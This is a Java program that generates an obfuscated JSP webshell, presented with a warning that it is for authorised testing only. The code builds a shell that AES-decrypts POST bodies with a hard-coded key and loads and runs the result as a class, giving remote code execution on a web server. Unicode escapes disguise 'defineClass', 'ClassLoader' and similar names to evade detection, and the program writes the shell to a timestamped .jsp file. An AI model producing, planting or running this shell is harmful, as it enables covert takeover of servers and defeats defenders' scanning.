package company;

import org.apache.commons.lang.StringUtils;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

public class Main {

    public static void main(String[] paramArrayOfString)  {
        //godz

        System.out.println(StringUtils.EMPTY);

        System.out.println(StringUtils.EMPTY);
        System.out.println("*************************警 告*****************************");
        System.out.println("本工具旨在帮助企业快速定位漏洞修复漏洞,仅限授权安全测试使用!");
        System.out.println("严格遵守《中华人民共和国网络安全法》,禁止未授权非法攻击站点!");
        System.out.println("***********************************************************");
        System.out.println("WebShell默认密码为:test");
        String str = "tas9er" +"test";
        String str2 = "tas9er" +"test";
        String str3 = "tas9er" +"test";
        String str4 = "tas9er" +"test";
        String str5 = "tas9er" +"test";
        String str6 = "tas9er" +"test";
        String str7 = "tas9er" +"test";
        String str8 = "tas9er" +"test";
        String str9 = "tas9er" +"test";
        String str10 = "tas9er" +"test";
        String str11 = "tas9er" +"test";
        String str12 = "tas9er" +"test";
        String str13 = "tas9er" +"test";
        String replaceAll = ("Hello Administrator!\nWelCome To Tas9er Java Console!" + ("<%@page import=\"sun.misc.*,javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec,java.util.Random\" %>\n<%!\n    class " + str + " extends ClassLoader {\n        " + str + "(ClassLoader " + str2 + ") {\n            super(" + str2 + ");\n        }\n        public Class " + str3 + "(byte[] " + str4 + ") {\n            return super.defineClass(" + str4 + ",0," + str4 + ".length);\n        }\n    }\n%>") + ("<%\n    out.println(\"Random Garbage Data:\");\n    Random " + str9 + " = new Random();\n    int " + str10 + " = " + str9 + ".nextInt(1234);\n    int " + str11 + " = " + str9 + ".nextInt(5678);\n    int " + str12 + " = " + str9 + ".nextInt(1357);\n    int " + str13 + " = " + str9 + ".nextInt(2468);\n    out.println(" + str10 + "+\",\"+" + str11 + "+\",\"+" + str12 + "+\",\"+" + str13 + ");\n    String[] " + str5 + " = new String[]{\"A\", \"P\", \"B\", \"O\", \"C\", \"S\", \"D\", \"T\"};\n    String " + str6 + " = " + str5 + "[1] + " + str5 + "[3] + " + str5 + "[5] + " + str5 + "[7];\n    if (request.getMethod().equals(" + str6 + ")) {\n        String " + str8 + " = new String(new BASE64Decoder().decodeBuffer(\"MTZhY2FjYzA1YWFmYWY2Nw==\"));\n        session.setAttribute(\"u\", " + str8 + ");\n        Cipher " + str7 + " = Cipher.getInstance(\"AES\");\n        " + str7 + ".init(((" + str10 + " * " + str11 + " + " + str12 + " - " + str13 + ") * 0) + 3 - 1, new SecretKeySpec(" + str8 + ".getBytes(), \"AES\"));\n        new " + str + "(this.getClass().getClassLoader())." + str3 + "(" + str7 + ".doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);\n    }\n%>")).replaceAll("defineClass", "d\\\\uuuuuuuuu0065fineClass").replaceAll("BASE64Decoder", "B\\\\u0041\\\\u0053\\\\u0045\\\\u0036\\\\u0034\\\\u0044\\\\u0065\\\\u0063\\\\u006f\\\\u0064\\\\u0065\\\\u0072").replaceAll("getClass", "\\\\u0067\\\\u0065t\\\\u0043\\\\u006c\\\\u0061\\\\u0073\\\\u0073").replaceAll("ClassLoader", "\\\\u0043l\\\\u0061\\\\u0073\\\\u0073\\\\u004c\\\\u006f\\\\u0061\\\\u0064\\\\u0065\\\\u0072");
        System.out.println(StringUtils.EMPTY);
        System.out.println("[+]Loading Random Algorithm......");
        try {
            Thread.sleep(2000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        System.out.println("[+]Checking Coding Compliance......");
        try {
            Thread.sleep(2000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        System.out.println("[+]Creating Local File......");
        try {
            BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(new File(new SimpleDateFormat("yyyyMMddhhmmss").format(new Date()) + ".jsp")));

            bufferedWriter.write(replaceAll);
            bufferedWriter.flush();
            bufferedWriter.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

        System.out.println("[+]Succussfully");
    }
}
